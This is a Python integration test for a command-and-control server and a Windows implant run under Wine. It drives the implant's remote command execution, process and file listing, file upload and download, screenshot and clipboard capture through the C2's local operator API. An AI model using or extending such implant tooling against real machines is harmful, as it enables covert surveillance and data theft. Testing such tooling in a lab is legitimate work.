#!/usr/bin/env python3
"""
test_windows.py — Windows implant integration test
Runs inside the Docker container (Dockerfile.windows-test).

Architecture:
  - This script starts a C2 in-process (Python, port 9447)
  - Launches implant_beacon.exe under Wine
  - Verifies basic tasks work against Windows code paths
"""

import sys
import os
import subprocess
import threading
import time
import json
import ssl
import urllib.request
import tempfile
import base64

# Add parent dir to path so we can import c2_beacon
sys.path.insert(0, "/build")

# ── start C2 ─────────────────────────────────────────────────────────────────

print("[*] Starting C2...")
import c2_beacon  # noqa: E402

# Override the port so we don't conflict with any running C2
TEST_PORT_IMPLANT = 9447
TEST_PORT_OPERATOR = 9448

# Patch the ports before starting servers
c2_beacon.IMPLANT_PORT  = TEST_PORT_IMPLANT
c2_beacon.OPERATOR_PORT = TEST_PORT_OPERATOR

t_c2 = threading.Thread(target=c2_beacon.start_servers, daemon=True)
t_c2.start()
time.sleep(2)
print("[+] C2 started")


# ── helpers ───────────────────────────────────────────────────────────────────

def http(method, path, body=None):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = f"https://localhost:{TEST_PORT_OPERATOR}{path}"
    data = json.dumps(body).encode() if body else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            text = resp.read().decode()
            return json.loads(text) if text else {}
    except Exception as e:
        return {"error": str(e)}


def wait_for(fn, timeout=20, interval=0.5):
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = fn()
        if result:
            return result
        time.sleep(interval)
    return None


def queue_task(iid, task_type, payload=None):
    return http("POST", f"/api/task/{iid}", {"type": task_type, **(payload or {})})


def wait_result(iid, task_type, timeout=15):
    def got():
        results = c2_beacon.result_store.get(iid, [])
        return next((r for r in results if r.get("type") == task_type), None)
    return wait_for(got, timeout=timeout)


# ── launch Windows implant under Wine ────────────────────────────────────────

print("[*] Launching implant_beacon.exe under Wine...")
proc = subprocess.Popen(
    ["wine", "/build/implant_beacon.exe"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    env={**os.environ, "WINEPATH": "/build"},
)

# Wait for implant to register
print("[*] Waiting for implant to register...")
existing = set(c2_beacon.implants.keys())

def new_implant():
    new = [i for i in c2_beacon.implants if i not in existing]
    return new[0] if new else None

iid = wait_for(new_implant, timeout=30)
if not iid:
    print("[!] FAIL: Windows implant did not register within 30s")
    proc.kill()
    sys.exit(1)

info = c2_beacon.implants[iid]
print(f"[+] Implant registered: {iid[:8]} ({info.get('user')}@{info.get('hostname')}, {info.get('os')})")


# ── run tests ─────────────────────────────────────────────────────────────────

PASS = 0
FAIL = 0


def test(name, fn):
    global PASS, FAIL
    try:
        fn()
        print(f"  [PASS] {name}")
        PASS += 1
    except AssertionError as e:
        print(f"  [FAIL] {name}: {e}")
        FAIL += 1


def t_execute():
    queue_task(iid, "execute", {"command": "echo windows_test_ok"})
    r = wait_result(iid, "execute")
    assert r is not None, "no result"
    assert r["ok"], f"not ok: {r}"
    assert "windows_test_ok" in r.get("output", ""), f"missing output: {r}"
    c2_beacon.result_store[iid].clear()


def t_sysinfo():
    queue_task(iid, "sysinfo")
    r = wait_result(iid, "sysinfo")
    assert r is not None, "no result"
    assert r["ok"], f"not ok: {r}"
    output = r.get("output", "")
    assert "OS:" in output, f"no OS in output: {output[:200]}"
    c2_beacon.result_store[iid].clear()


def t_ps():
    queue_task(iid, "ps")
    r = wait_result(iid, "ps")
    assert r is not None, "no result"
    assert r["ok"], f"not ok: {r}"
    entries = r.get("entries", [])
    assert len(entries) > 0, "no processes returned"
    first = entries[0]
    assert "pid" in first and "cmd" in first, f"bad entry format: {first}"
    c2_beacon.result_store[iid].clear()


def t_ls():
    queue_task(iid, "ls", {"path": "C:\\Windows"})
    r = wait_result(iid, "ls", timeout=20)
    assert r is not None, "no result"
    assert r["ok"], f"not ok: {r}"
    entries = r.get("entries", [])
    assert len(entries) > 0, "no files returned"
    c2_beacon.result_store[iid].clear()


def t_netstat():
    queue_task(iid, "netstat")
    r = wait_result(iid, "netstat", timeout=20)
    assert r is not None, "no result"
    assert r["ok"], f"not ok: {r}"
    c2_beacon.result_store[iid].clear()


def t_upload_download():
    content = b"hello from windows test"
    b64 = base64.b64encode(content).decode()
    fname = "C:\\Windows\\Temp\\c2_test_file.txt"
    queue_task(iid, "upload", {"filename": fname, "file": b64})
    r = wait_result(iid, "upload")
    assert r is not None and r["ok"], f"upload failed: {r}"
    c2_beacon.result_store[iid].clear()

    queue_task(iid, "download", {"filepath": fname})
    r = wait_result(iid, "download")
    assert r is not None and r["ok"], f"download failed: {r}"
    decoded = base64.b64decode(r.get("data", ""))
    assert decoded == content, f"content mismatch: {decoded}"
    c2_beacon.result_store[iid].clear()


def t_screenshot():
    queue_task(iid, "screenshot")
    r = wait_result(iid, "screenshot", timeout=20)
    assert r is not None, "no result"
    # OK either way — Wine may not have a display, screenshot may fail gracefully
    c2_beacon.result_store[iid].clear()


def t_clipboard():
    queue_task(iid, "clipboard")
    r = wait_result(iid, "clipboard", timeout=15)
    assert r is not None, "no result"
    # OK either way — clipboard may be empty under Wine
    c2_beacon.result_store[iid].clear()


print("\n[*] Running Windows implant tests:")
test("execute", t_execute)
test("sysinfo", t_sysinfo)
test("ps", t_ps)
test("ls", t_ls)
test("netstat", t_netstat)
test("upload+download", t_upload_download)
test("screenshot (may fail gracefully without display)", t_screenshot)
test("clipboard (may be empty)", t_clipboard)


# ── cleanup ───────────────────────────────────────────────────────────────────

proc.terminate()
print(f"\n{'='*40}")
print(f"Windows implant tests: {PASS} passed, {FAIL} failed")
print('='*40)
sys.exit(0 if FAIL == 0 else 1)
